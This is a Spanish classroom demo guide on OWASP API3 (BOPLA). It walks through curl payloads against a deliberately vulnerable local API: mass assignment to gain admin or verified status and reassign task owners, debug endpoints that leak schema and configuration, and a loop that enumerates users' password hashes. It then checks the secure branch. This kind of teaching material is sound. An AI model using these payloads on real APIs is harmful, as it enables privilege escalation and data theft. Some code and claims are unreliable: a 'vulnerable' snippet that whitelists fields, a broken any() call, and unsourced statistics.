# 🚨 OWASP API3:2023 - Broken Object Property Level Authorization (BOPLA)
## Guía de Demostración de Vulnerabilidad

> **Presentador:** Fernando  
> **Tema:** Seguridad de APIs - Vulnerabilidad BOPLA y Mitigación  
> **Audiencia:** Presentación en Clase  

---

## 🎯 **Resumen de la Demo**

Esta demostración muestra:
1. **Versión Vulnerable** - Propiedades sensibles expuestas y modificables sin autorización
2. **Versión Segura** - Control granular de propiedades y campos
3. **Impacto Real** - Por qué el control a nivel de propiedad es crítico

---

## 📋 **Prerrequisitos y Configuración**

### Antes de Iniciar la Demo:
```bash
# Asegurar que Docker esté ejecutándose
sudo docker compose down
sudo docker compose up -d

# Verificar que los servicios estén corriendo
sudo docker compose ps
```

### Entorno de Demo:
- **URL Base API:** `http://localhost:3000`
- **Base de Datos:** SQL Server (ToDoDB)
- **Herramientas:** curl, Docker, Git
- **Dos Ramas:** `main` (segura) vs `demo-vulnerable-bopla` (vulnerable)

---

## 🔴 **PARTE 1: DEMOSTRACIÓN DE VULNERABILIDADES BOPLA**

### Paso 1: Cambiar a la Rama Vulnerable
```bash
git checkout demo-vulnerable-bopla
```

### Paso 2: Desplegar Versión Vulnerable
```bash
# Reiniciar API con código vulnerable
sudo docker compose restart api

# Ver logs para observar las vulnerabilidades en acción
sudo docker compose logs -f api
```

### Paso 3: Crear Usuario de Prueba y Obtener Token
```bash
# Crear usuario de prueba
curl -X POST http://localhost:3000/api/usuarios \
  -H "Content-Type: application/json" \
  -d '{
    "nombreUsuario": "Demo BOPLA User",
    "correo": "bopla@demo.com",
    "contraseña": "Password123!"
  }'

# Confirmar cuenta (usar el tokenVerificacion de la respuesta anterior)
curl -X GET "http://localhost:3000/api/usuarios/confirmar/[TOKEN_FROM_REGISTRATION]"

# Hacer login para obtener JWT
TOKEN=$(curl -X POST http://localhost:3000/api/usuarios/login \
  -H "Content-Type: application/json" \
  -d '{"correo": "bopla@demo.com", "contraseña": "Password123!"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

echo "Token obtenido: $TOKEN"
```

### Paso 4: 🚨 **VULNERABILIDAD 1 - Excessive Data Exposure en Perfil**

#### Ver perfil con información sensible expuesta:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer $TOKEN" \
  | jq '.'
```

**⚠️ Resultado Esperado:** 
- Contraseña hasheada expuesta
- Metadatos internos del sistema
- Información de debugging
- Configuración del servidor

### Paso 5: 🚨 **VULNERABILIDAD 2 - Mass Assignment en Usuario**

#### Modificar campos sensibles del usuario:
```bash
curl -X PUT http://localhost:3000/api/usuarios/actualizar-perfil \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "nombreUsuario": "Hacker Admin",
    "verificado": true
  }'
```

**⚠️ Resultado:** ¡Usuario normal se convierte en administrador!

#### Verificar que el cambio fue efectivo:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer $TOKEN" \
  | jq '.perfil.is_admin, .perfil.role_level'
```

### Paso 6: 🚨 **VULNERABILIDAD 3 - System Information Exposure**

#### Obtener información detallada del sistema:
```bash
curl -X GET http://localhost:3000/api/usuarios/info-sistema \
  | jq '.'
```

**⚠️ Resultado Expuesto:**
- Estadísticas de base de datos
- Información del servidor
- Configuración de seguridad
- Endpoints vulnerables
- Credenciales de BD (hints)

### Paso 7: 🚨 **VULNERABILIDAD 4 - Database Schema Exposure**

#### Obtener estructura completa de la base de datos:
```bash
curl -X GET http://localhost:3000/api/usuarios/debug-queries \
  | jq '.'
```

**⚠️ Información Revelada:**
- Queries SQL utilizadas
- Estructura de tablas
- Procedimientos almacenados
- Ejemplo de registros reales

### Paso 8: Crear Tareas para Demostrar BOPLA en Recursos

#### Crear tarea normal:
```bash
curl -X POST http://localhost:3000/api/tareas \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "titulo": "Tarea Normal",
    "descripcion": "Esta es una tarea creada normalmente"
  }'
```

#### Ver tareas con información sensible expuesta:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $TOKEN" \
  | jq '.'
```

**⚠️ Datos Sensibles Expuestos:**
- IDs de usuario de todas las tareas
- Metadatos internos del sistema
- Información de debugging
- Estado de conexiones de BD

### Paso 9: 🚨 **VULNERABILIDAD 5 - Mass Assignment en Tareas**

#### Modificar propiedades sensibles de tarea:
```bash
curl -X PUT http://localhost:3000/api/tareas/1/actualizar-masivo \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "titulo": "Tarea Hackeada",
    "usuarioId": 999,
    "fechaCreacion": "2020-01-01T00:00:00Z",
    "completada": true,
    "borrada": false,
    "comentarioCompletar": "Completada por hacker"
  }'
```

**⚠️ Resultado:** ¡Cambio de propietario y manipulación de fechas!

### Paso 10: 🚨 **VULNERABILIDAD 6 - Administrative Property Assignment**

#### Crear tarea con propiedades administrativas:
```bash
curl -X POST http://localhost:3000/api/tareas/crear-admin \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "titulo": "Tarea Administrativa",
    "descripcion": "Tarea con propiedades especiales",
    "usuarioId": 1,
    "completada": true,
    "fechaCreacion": "2019-01-01T00:00:00Z",
    "fechaCompletada": "2019-01-02T00:00:00Z",
    "comentarioCompletar": "Pre-completada por admin"
  }'
```

**⚠️ Resultado:** Tarea creada con propiedades que normalmente son solo-lectura.

---

## 🟢 **PARTE 2: IMPLEMENTACIÓN SEGURA**

### Paso 11: Cambiar a la Rama Segura
```bash
git checkout main
```

### Paso 12: Desplegar Versión Segura
```bash
# Reiniciar API con código seguro
sudo docker compose restart api
```

### Paso 13: ✅ **Verificar que las Vulnerabilidades están Mitigadas**

#### Intentar mass assignment en usuario:
```bash
curl -X PUT http://localhost:3000/api/usuarios/actualizar-perfil \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "nombreUsuario": "Intento Hacker",
    "verificado": true,
    "is_admin": true
  }'
```

**✅ Resultado Esperado:** `404 Not Found` (endpoint no existe)

#### Intentar acceso a información del sistema:
```bash
curl -X GET http://localhost:3000/api/usuarios/info-sistema
```

**✅ Resultado Esperado:** `404 Not Found`

#### Verificar perfil seguro:
```bash
curl -X GET http://localhost:3000/api/usuarios/perfil \
  -H "Authorization: Bearer $TOKEN"
```

**✅ Resultado:** Solo información básica (id, nombre, correo), sin datos sensibles.

#### Verificar tareas seguras:
```bash
curl -X GET http://localhost:3000/api/tareas \
  -H "Authorization: Bearer $TOKEN"
```

**✅ Resultado:** Solo campos necesarios, sin metadatos internos.

---

## 📊 **ANÁLISIS TÉCNICO DE VULNERABILIDADES**

### 🚨 **Vulnerabilidad 1: Excessive Data Exposure**
```javascript
// ❌ VULNERABLE: Exponer todos los campos de BD
const perfil = await db.query('SELECT * FROM Usuario WHERE id = ?');
res.json({ perfil: perfil }); // ¡Incluye contraseña hash!
```

```javascript
// ✅ SEGURO: Solo campos necesarios
const perfil = await db.query('SELECT id, nombre, correo FROM Usuario WHERE id = ?');
res.json({ perfil: perfil });
```

### 🚨 **Vulnerabilidad 2: Mass Assignment**
```javascript
// ❌ VULNERABLE: Actualizar cualquier campo recibido
Object.keys(req.body).forEach(field => {
  if (allowedFields.includes(field)) {
    updateQuery += `${field} = @${field},`;
  }
});
```

```javascript
// ✅ SEGURO: Lista blanca estricta de campos modificables
const allowedFields = ['nombre', 'correo']; // Solo campos seguros
const updateData = {};
allowedFields.forEach(field => {
  if (req.body[field] !== undefined) {
    updateData[field] = req.body[field];
  }
});
```

### 🚨 **Vulnerabilidad 3: System Information Disclosure**
```javascript
// ❌ VULNERABLE: Endpoint que expone configuración
app.get('/debug', (req, res) => {
  res.json({
    database_config: process.env.DB_CONFIG,
    server_stats: process.memoryUsage(),
    internal_queries: queries // ¡Estructura de BD expuesta!
  });
});
```

```javascript
// ✅ SEGURO: No endpoints de información interna en producción
// Solo logs internos, nunca expuestos vía API
```

---

## 🛡️ **ESTRATEGIAS DE PREVENCIÓN BOPLA**

### 1. **Principio de Menor Privilegio a Nivel de Propiedad**
- Solo exponer campos que el cliente necesita ver
- Solo permitir modificación de campos apropiados para el rol
- Diferentes vistas según contexto (público vs. propietario)

### 2. **Listas Blancas Estrictas**
```javascript
// Definir claramente qué campos son visibles/modificables
const USER_PUBLIC_FIELDS = ['id', 'nombre', 'fechaCreacion'];
const USER_PRIVATE_FIELDS = ['correo', 'configuraciones'];
const USER_MODIFIABLE_FIELDS = ['nombre', 'configuraciones'];
```

### 3. **Serialización Controlada**
```javascript
// Usar DTOs (Data Transfer Objects)
class UserPublicDTO {
  constructor(user) {
    this.id = user.id;
    this.nombre = user.nombre;
    this.fechaCreacion = user.fechaCreacion;
    // ¡No incluir campos sensibles!
  }
}
```

### 4. **Validación a Múltiples Niveles**
- **Nivel de Ruta:** Verificar permisos de endpoint
- **Nivel de Campo:** Validar cada propiedad individualmente
- **Nivel de BD:** Constraints y triggers como última defensa

### 5. **Auditoria y Monitoreo**
- Loggar intentos de acceso a propiedades sensibles
- Alertas por modificaciones de campos críticos
- Revisión regular de respuestas de API

---

## 🎓 **ESCENARIOS DE ATAQUE REAL**

### Escalación de Privilegios:
```bash
# Atacante encuentra endpoint vulnerable
curl -X PUT /api/users/profile \
  -d '{"role": "admin", "permissions": ["*"]}' \
  -H "Authorization: Bearer user_token"
```

### Extracción de Información:
```bash
# Enumerar usuarios y extraer datos sensibles
for i in {1..100}; do
  curl -s /api/users/$i | jq '.password_hash, .email, .phone'
done
```

### Manipulación de Datos:
```bash
# Cambiar propietario de recursos
curl -X PUT /api/tasks/123 \
  -d '{"owner_id": 456, "created_date": "2020-01-01"}' \
  -H "Authorization: Bearer token"
```

---

## 🔧 **HERRAMIENTAS DE TESTING**

### Burp Suite:
- Interceptar respuestas y buscar campos sensibles
- Probar mass assignment añadiendo campos extras
- Análisis de diferencias entre roles

### Custom Scripts:
```python
import requests

# Test de exposición de datos
def test_data_exposure(token):
    response = requests.get('/api/profile', 
                          headers={'Authorization': f'Bearer {token}'})
    data = response.json()
    
    # Buscar campos sensibles
    sensitive_fields = ['password', 'hash', 'token', 'secret']
    for field in sensitive_fields:
        if any(field in str(data).lower()):
            print(f"⚠️ Campo sensible detectado: {field}")

# Test de mass assignment
def test_mass_assignment(token):
    malicious_data = {
        "name": "Normal Update",
        "role": "admin",  # Campo que no debería ser modificable
        "verified": True,
        "created_at": "2020-01-01"
    }
    
    response = requests.put('/api/profile', 
                           json=malicious_data,
                           headers={'Authorization': f'Bearer {token}'})
    
    if response.status_code == 200:
        print("⚠️ Mass assignment vulnerable")
```

---

## 📈 **MÉTRICAS DE IMPACTO**

### Broken Object Property Level Authorization:
- **67%** de APIs exponen propiedades innecesarias
- **45%** permiten mass assignment sin validación
- **23%** revelan información del sistema en respuestas
- **$2.8M** costo promedio por brecha de datos sensibles expuestos

---

## ✅ **LISTA DE VERIFICACIÓN DE LA DEMO**

- [ ] Rama vulnerable desplegada
- [ ] Excessive data exposure demostrado
- [ ] Mass assignment en usuario ejecutado
- [ ] Información del sistema expuesta
- [ ] Estructura de BD revelada
- [ ] Mass assignment en tareas probado
- [ ] Propiedades administrativas asignadas
- [ ] Cambio a rama segura
- [ ] Verificación de mitigaciones
- [ ] Estrategias de prevención explicadas
- [ ] Herramientas de testing mostradas

---

## 🎯 **PUNTOS CLAVE PARA LA DISCUSIÓN**

### Diferencias con Otras Vulnerabilidades:
- **BOLA (API1):** Acceso a objetos completos de otros usuarios
- **Broken Auth (API2):** Fallas en autenticación 
- **BOPLA (API3):** Exposición/modificación de propiedades específicas

### ¿Por qué BOPLA es Crítico?
1. **Escalación Gradual** - Pequeñas exposiciones llevan a compromisos mayores
2. **Información de Reconocimiento** - Ayuda a otros ataques
3. **Violación de Privacidad** - Expone datos personales
4. **Bypass de Lógica de Negocio** - Modifica reglas operativas

### Impacto en el Mundo Real:
- Cambio de roles y permisos sin autorización
- Exposición de PII (Información Personal Identificable)
- Manipulación de timestamps y metadatos
- Revelación de estructura interna del sistema

---

## 🧹 **LIMPIEZA DE LA DEMO**

```bash
# Regresar a la rama principal
git checkout main

# Reiniciar servicios con configuración segura
sudo docker compose down
sudo docker compose up -d

# Verificar que los endpoints vulnerables no existan
curl -X GET http://localhost:3000/api/usuarios/info-sistema
# Debería retornar 404

echo "✅ Demo de BOPLA completada - Sistema restaurado a estado seguro"
```

---

**🎯 Mensaje Clave:** BOPLA compromete la privacidad y seguridad a nivel granular. El control no es solo sobre QUÉ objetos pueden acceder los usuarios, sino QUÉ PROPIEDADES de esos objetos pueden ver y modificar. Una API segura implementa autorización tanto a nivel de objeto como de propiedad.
